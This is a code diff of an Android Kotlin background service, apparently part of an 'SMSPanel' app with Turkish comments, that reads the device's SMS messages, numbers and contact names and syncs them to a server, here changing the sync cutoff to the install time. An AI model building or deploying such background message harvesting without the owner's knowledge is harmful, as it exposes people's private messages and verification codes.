@@ -199,12 +199,18 @@ class SMSBackgroundService : Service() {
             return
         }
 
-        // Son sync zamanını al
-        val lastSyncTime = prefs.getLong("lastSyncTimestamp", 0)
-        android.util.Log.d("SMSPanel", "Son sync zamanı: $lastSyncTime")
+        // İlk kurulum zamanını kontrol et
+        var installTimestamp = prefs.getLong("installTimestamp", 0)
+        if (installTimestamp == 0L) {
+            // İlk kez çalışıyor, şu anki zamanı kaydet
+            installTimestamp = System.currentTimeMillis()
+            prefs.edit().putLong("installTimestamp", installTimestamp).apply()
+            android.util.Log.d("SMSPanel", "İlk kurulum zamanı kaydedildi: $installTimestamp")
+            sendLogBroadcast("⚙️ Kurulum zamanı kaydedildi")
+        }
 
-        // SMS'leri oku
-        val messages = readSMSMessages(lastSyncTime)
+        // Kurulum zamanından sonraki SMS'leri oku
+        val messages = readSMSMessages(installTimestamp)
         android.util.Log.d("SMSPanel", "Cihazdan okunan SMS sayısı: ${messages.size}")
 
         if (messages.isEmpty()) {
@@ -249,15 +255,11 @@ class SMSBackgroundService : Service() {
                     val synced = (result["synced"] as? Double)?.toInt() ?: 0
                     val duplicates = (result["duplicates"] as? Double)?.toInt() ?: 0
 
-                    // En yeni SMS'in timestamp'ini bul (gönderdiğimiz mesajlardan)
-                    val newestTimestamp = messages.maxOfOrNull { (it["timestamp"] as? Long) ?: 0L } ?: System.currentTimeMillis()
-
                     // İstatistikleri güncelle
                     val totalSynced = prefs.getInt("syncedSms", 0) + synced
                     prefs.edit()
                         .putInt("syncedSms", totalSynced)
                         .putLong("lastSync", System.currentTimeMillis())
-                        .putLong("lastSyncTimestamp", newestTimestamp) // En yeni SMS timestamp'i kullan
                         .apply()
 
                     android.util.Log.d("SMSPanel", "✓ $synced SMS senkronize edildi, $duplicates duplicate (Toplam: $totalSynced)")
@@ -279,80 +281,87 @@ class SMSBackgroundService : Service() {
     private fun readSMSMessages(sinceTimestamp: Long): List<Map<String, Any>> {
         val messages = mutableListOf<Map<String, Any>>()
 
-        // Daha önce gönderilmiş SMS ID'lerini al
-        val sentSmsIds = prefs.getStringSet("sentSmsIds", mutableSetOf()) ?: mutableSetOf()
-        val newSentIds = mutableSetOf<String>()
-        newSentIds.addAll(sentSmsIds)
-
         val uri = Telephony.Sms.CONTENT_URI
         val projection = arrayOf(
             Telephony.Sms._ID,
             Telephony.Sms.ADDRESS,
             Telephony.Sms.BODY,
             Telephony.Sms.DATE,
-            Telephony.Sms.TYPE
+            Telephony.Sms.TYPE,
+            Telephony.Sms.PERSON
         )
 
-        val selection = if (sinceTimestamp > 0) {
-            "${Telephony.Sms.DATE} > ?"
-        } else null
+        // Kurulum zamanından sonraki SMS'leri filtrele
+        val selection = "${Telephony.Sms.DATE} > ?"
+        val selectionArgs = arrayOf(sinceTimestamp.toString())
 
-        val selectionArgs = if (sinceTimestamp > 0) {
-            arrayOf(sinceTimestamp.toString())
-        } else null
+        // En yeni SMS'ler önce gelsin
+        val sortOrder = "${Telephony.Sms.DATE} DESC"
 
-        val sortOrder = "${Telephony.Sms.DATE} DESC LIMIT 500"
+        android.util.Log.d("SMSPanel", "SMS okuma başlıyor - Kurulum zamanı: $sinceTimestamp")
 
         try {
             contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
-                while (cursor.moveToNext()) {
-                    val smsId = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms._ID))
-                    val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: continue
-                    val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
-                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
-                    val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
+                val totalFound = cursor.count
+                android.util.Log.d("SMSPanel", "Cursor'da toplam $totalFound SMS bulundu")
 
-                    // Bu SMS daha önce gönderilmiş mi kontrol et
-                    if (sentSmsIds.contains(smsId.toString())) {
-                        android.util.Log.d("SMSPanel", "SMS ID $smsId zaten gönderilmiş, atlanıyor")
-                        continue
+                var readCount = 0
+                while (cursor.moveToNext() && readCount < 500) { // Max 500 SMS
+                    try {
+                        val smsId = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms._ID))
+                        val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
+                        val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
+                        val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
+                        val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
+
+                        // Geçersiz veri kontrolü
+                        if (address.isNullOrBlank() || body == null) {
+                            android.util.Log.w("SMSPanel", "SMS ID $smsId: Geçersiz veri, atlanıyor")
+                            continue
+                        }
+
+                        val smsType = when (type) {
+                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "received"
+                            Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
+                            else -> "received"
+                        }
+
+                        val contactName = getContactName(address)
+
+                        messages.add(mapOf(
+                            "smsId" to smsId,
+                            "phoneNumber" to address,
+                            "contactName" to contactName,
+                            "message" to body,
+                            "type" to smsType,
+                            "timestamp" to date
+                        ))
+
+                        readCount++
+
+                        if (readCount <= 5) {
+                            android.util.Log.d("SMSPanel", "SMS #$readCount: ID=$smsId, From=$address, Type=$smsType, Date=$date")
+                        }
+                    } catch (e: Exception) {
+                        android.util.Log.e("SMSPanel", "SMS okuma hatası (cursor): ${e.message}")
                     }
-
-                    val smsType = when (type) {
-                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "received"
-                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
-                        else -> "received"
-                    }
-
-                    val contactName = getContactName(address)
-
-                    messages.add(mapOf(
-                        "smsId" to smsId,
-                        "phoneNumber" to address,
-                        "contactName" to contactName,
-                        "message" to body,
-                        "type" to smsType,
-                        "timestamp" to date
-                    ))
-
-                    // Bu ID'yi gönderilmiş olarak işaretle
-                    newSentIds.add(smsId.toString())
                 }
+
+                android.util.Log.d("SMSPanel", "Toplam $readCount SMS okundu")
             }
 
             // Toplam SMS sayısını güncelle
             val totalCount = getTotalSMSCount()
-
-            // Gönderilmiş SMS ID'lerini kaydet
             prefs.edit()
                 .putInt("totalSms", totalCount)
-                .putStringSet("sentSmsIds", newSentIds)
                 .apply()
 
         } catch (e: Exception) {
-            android.util.Log.e("SMSPanel", "SMS okuma hatası: ${e.message}")
+            android.util.Log.e("SMSPanel", "SMS okuma hatası (genel): ${e.message}")
+            e.printStackTrace()
         }
 
+        android.util.Log.d("SMSPanel", "readSMSMessages tamamlandı: ${messages.size} SMS")
         return messages
     }
 
